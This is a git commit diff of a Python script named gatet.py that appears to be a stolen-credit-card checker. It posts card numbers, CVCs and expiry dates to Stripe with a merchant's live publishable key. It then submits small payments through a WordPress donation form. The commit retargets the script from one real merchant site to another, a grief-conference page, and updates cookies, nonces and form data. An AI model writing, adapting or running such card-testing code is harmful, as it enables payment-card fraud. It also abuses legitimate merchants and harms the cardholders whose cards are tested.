52c6c38153cc3195598705a3dc62ea71d043c684
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-14 10:48:50 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -38,33 +38,27 @@ def Tele(cc_data):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51GNVZkCmff2HpFXWPLIJkfTlT6Su7Eq6gWYmMfHkrZQpfruXHDBKHaELfzSnhUQCfrGi1pQBwAGZtRXiv9KarRCj00PW04obKr'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'cookielawinfo-checkbox-necessary': 'yes',
-	    'cookielawinfo-checkbox-functional': 'yes',
-	    'cookielawinfo-checkbox-performance': 'yes',
-	    'cookielawinfo-checkbox-analytics': 'yes',
-	    'cookielawinfo-checkbox-advertisement': 'yes',
-	    'cookielawinfo-checkbox-others': 'yes',
-	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=',
-	    'viewed_cookie_policy': 'yes',
-	    '__stripe_mid': '60b9afb0-f87c-48df-9393-ecad8230aa35719248',
-	    '__stripe_sid': '0fbefb30-5522-4013-9842-09221fb48b02050190',
+	    '_ga': 'GA1.1.867590447.1744175270',
+	    '__stripe_mid': '08136e65-9524-4895-b8df-61816985366e667d09',
+	    '__stripe_sid': 'ed2eb0b0-bdf7-4f64-ba2a-f71735a8a055ade7d6',
+	    '_ga_GJL9GQNRTP': 'GS1.1.1744602113.4.1.1744602242.0.0.0',
 	}
 	
 	headers = {
-	    'authority': 'ornamentspa.eu',
+	    'authority': 'thehop-e.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=; viewed_cookie_policy=yes; __stripe_mid=60b9afb0-f87c-48df-9393-ecad8230aa35719248; __stripe_sid=0fbefb30-5522-4013-9842-09221fb48b02050190',
-	    'origin': 'https://ornamentspa.eu',
-	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
+	    # 'cookie': '_ga=GA1.1.867590447.1744175270; __stripe_mid=08136e65-9524-4895-b8df-61816985366e667d09; __stripe_sid=ed2eb0b0-bdf7-4f64-ba2a-f71735a8a055ade7d6; _ga_GJL9GQNRTP=GS1.1.1744602113.4.1.1744602242.0.0.0',
+	    'origin': 'https://thehop-e.com',
+	    'referer': 'https://thehop-e.com/breathe-thru-grief-conference/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -76,17 +70,15 @@ def Tele(cc_data):
 	}
 	
 	params = {
-	    't': '1744595586276',
+	    't': '1744602243466',
 	}
 	
-	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3De4edf751cf%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D0817480671%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
+	data = {
+	    'data': '__fluent_form_embded_post_id=6143&_fluentform_7_fluentformnonce=1bb387ebb4&_wp_http_referer=%2Fbreathe-thru-grief-conference%2F&name=Rodam%20User&address%5Baddress_line_1%5D=Street%2027&address%5Bcity%5D=New%20York&address%5Bstate%5D=New%20York&address%5Bzip%5D=10080&phone_number=0817480671&email_address=rodamuser08%40gmail.com&amount=1.00&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'action': 'fluentform_submit',
+	    'form_id': '7',
+	}
 	
-	r2 = requests.post(
-	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://thehop-e.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
